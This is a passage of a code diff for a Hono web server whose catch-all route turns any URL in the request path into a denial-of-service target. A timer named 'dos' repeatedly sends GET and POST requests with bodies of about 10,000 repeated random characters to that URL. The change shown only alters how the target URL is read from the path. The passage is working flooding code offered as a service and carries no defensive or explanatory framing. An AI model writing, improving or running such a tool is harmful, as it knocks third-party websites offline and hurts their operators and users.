@@ -3,21 +3,22 @@ import data from "./data.json" assert { type: "json" };
 
 const app = new Hono();
 
-app.all("/:url", async (c) => {
+app.all("/*", async (c) => {
+  const url = new URL(c.req.url).pathname.slice(1)
   const dos = setInterval(async () => {
-    fetch(c.req.params.url, {
+    fetch(url, {
       method: "GET",
       body: "a=" + Math.random().toString(36).repeat(10000)
     })
-    fetch(c.req.params.url, {
+    fetch(url, {
       method: "POST",
       body: "a=" + Math.random().toString(36).repeat(10000)
     })
-    fetch(c.req.params.url, {
+    fetch(url, {
       method: "GET",
       body: "a=" + Math.random().toString(36).repeat(10000)
     })
-    fetch(c.req.params.url, {
+    fetch(url, {
       method: "POST",
       body: "a=" + Math.random().toString(36).repeat(10000)
     })
